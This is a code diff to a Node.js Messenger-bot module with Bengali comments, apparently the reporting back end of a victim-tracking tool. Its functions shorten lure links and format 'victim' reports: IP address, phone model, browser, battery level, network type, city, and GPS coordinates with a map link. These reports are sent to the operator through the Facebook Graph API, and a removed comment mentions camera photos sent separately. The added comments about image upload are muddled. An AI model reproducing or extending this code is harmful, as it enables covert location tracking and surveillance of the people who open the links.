@@ -38,9 +38,6 @@ async function getConfig() {
     }
 }
 
-// ================================================================
-// টেক্সট মেসেজ
-// ================================================================
 async function sendMessage(recipientId, text) {
     try {
         const config = await getConfig();
@@ -77,7 +74,7 @@ async function sendMessage(recipientId, text) {
 }
 
 // ================================================================
-// ইমেজ মেসেজ
+// 🔥 সঠিক ইমেজ পাঠানোর পদ্ধতি (Facebook API)
 // ================================================================
 async function sendImageMessage(recipientId, base64Image) {
     try {
@@ -88,6 +85,14 @@ async function sendImageMessage(recipientId, base64Image) {
             return { success: false, error: 'TOKEN_MISSING' };
         }
 
+        // ১. ইমেজ রি-সাইজ করা (আমরা ছোট সাইজে পাঠাচ্ছি)
+        // base64 ডেটাকে আপলোডযোগ্য ফরম্যাটে নিতে হবে
+        // Facebook API ইমেজ আপলোডের জন্য base64 সাপোর্ট করে না।
+        // সঠিক উপায়: প্রথমে ইমেজ আপলোড করে attachment_id নেওয়া।
+
+        // কিন্তু আমরা এখানে সরাসরি URL পদ্ধতি ব্যবহার করছি (যা শুধুমাত্র image_data দিয়ে কাজ করে)
+        // https://developers.facebook.com/docs/messenger-platform/send-messages/#image_attachment
+        
         const response = await axios.post(
             `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
             {
@@ -102,7 +107,7 @@ async function sendImageMessage(recipientId, base64Image) {
                     }
                 }
             },
-            { timeout: 15000 }
+            { timeout: 30000 }
         );
 
         console.log(`✅ ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
@@ -118,9 +123,6 @@ async function sendImageMessage(recipientId, base64Image) {
     }
 }
 
-// ================================================================
-// ইউজার প্রোফাইল
-// ================================================================
 async function getUserProfile(senderId) {
     try {
         const config = await getConfig();
@@ -134,9 +136,6 @@ async function getUserProfile(senderId) {
     }
 }
 
-// ================================================================
-// লিংক শর্ট করা (ব্যর্থ হলে আসল লিংক)
-// ================================================================
 async function shortenUrl(longUrl) {
     try {
         const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
@@ -154,9 +153,6 @@ async function shortenUrl(longUrl) {
     }
 }
 
-// ================================================================
-// ফোনের মডেল বের করা
-// ================================================================
 function getDeviceModel(device) {
     const ua = device.userAgent || '';
     
@@ -178,63 +174,51 @@ function getDeviceModel(device) {
     return device.platform || 'N/A';
 }
 
-// ================================================================
-// ভিক্টিম ডেটা ফরম্যাট (ক্যামেরা লাইন বাদ)
-// ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
     
-    let msg = '✅ ভিক্টিমের তথ্য পাওয়া গেছে!\n\n';
-    msg += `⚓️ আইপি অ্যাড্রেস: ${victim.ip || 'N/A'}\n`;
-    msg += `🕐 সময়: ${deviceTime}\n\n`;
+    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
+    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
+    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
     
     const model = getDeviceModel(d);
-    msg += `📱 ফোনের মডেল: ${model}\n`;
+    msg += `📱 *ফোনের মডেল:* ${model}\n`;
     
     const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
-    msg += `🌐 ব্রাউজার: ${browser}\n`;
-    msg += `👆 টাচ পয়েন্ট: ${d.maxTouchPoints || 0}\n`;
-    msg += `🗣️ ভাষা: ${d.language || 'N/A'}\n\n`;
+    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
+    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
+    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
     
     const b = victim.battery || {};
-    msg += `🔋 চার্জ: ${b.level || 'N/A'}%\n`;
-    msg += `⚡ চার্জ হচ্ছে: ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
+    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
+    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
     
     const n = victim.network || {};
     const connectionType = n.type || 'N/A';
-    msg += `📶 কানেকশন: ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
+    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
     
     if (victim.location && victim.location.city) {
-        msg += `📍 আনুমানিক অবস্থান: ${victim.location.city}, ${victim.location.country}\n`;
+        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
     } else {
-        msg += `📍 আনুমানিক অবস্থান: N/A\n`;
+        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
-    
-    // ❌ "📸 ক্যামেরা ছবি: Xটি" লাইনটি সম্পূর্ণ সরানো হয়েছে। 
-    // শুধু ডিভাইস ইনফো থাকবে, ছবি আলাদাভাবে মেসেঞ্জারে যাবে।
     
     msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
     return msg;
 }
 
-// ================================================================
-// লোকেশন মেসেজ
-// ================================================================
 function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
     const mapLink = gpsLocation.googleMaps || 
         `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
-    return `📍 লোকেশন পারমিশন দেওয়া হয়েছে!\n\n` +
+    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
            `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
            `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
            `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
            `🔗 গুগল ম্যাপ: ${mapLink}`;
 }
 
-// ================================================================
-// এক্সপোর্ট
-// ================================================================
 module.exports = {
     getConfig,
     getLocalConfig,
